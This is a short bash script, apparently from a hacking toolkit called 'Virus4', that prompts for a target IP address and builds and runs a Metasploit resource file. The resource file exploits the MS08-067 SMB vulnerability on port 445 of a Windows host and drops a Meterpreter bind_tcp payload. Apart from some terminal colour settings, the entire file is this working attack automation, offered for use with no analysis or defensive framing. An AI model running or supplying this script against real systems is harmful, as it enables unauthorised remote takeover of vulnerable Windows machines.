#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'                                                       
green='\033[1;32m'
red='\033[1;31m'                                                        
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install





echo -e "$cyan"
read -p "                  ip----->" ip
cd $HOME/Virus4/.msf
echo "use windows/smb/ms08_067_netapi" > .4msf.rc
echo "set payload windows/meterpreter/bind_tcp" >> .4msf.rc
echo "set RHOST $ip" >> .4msf.rc
echo "set RPORT 445" >> .4msf.rc
echo "exploit" >> .4msf.rc
msfconsole -r .4msf.rc
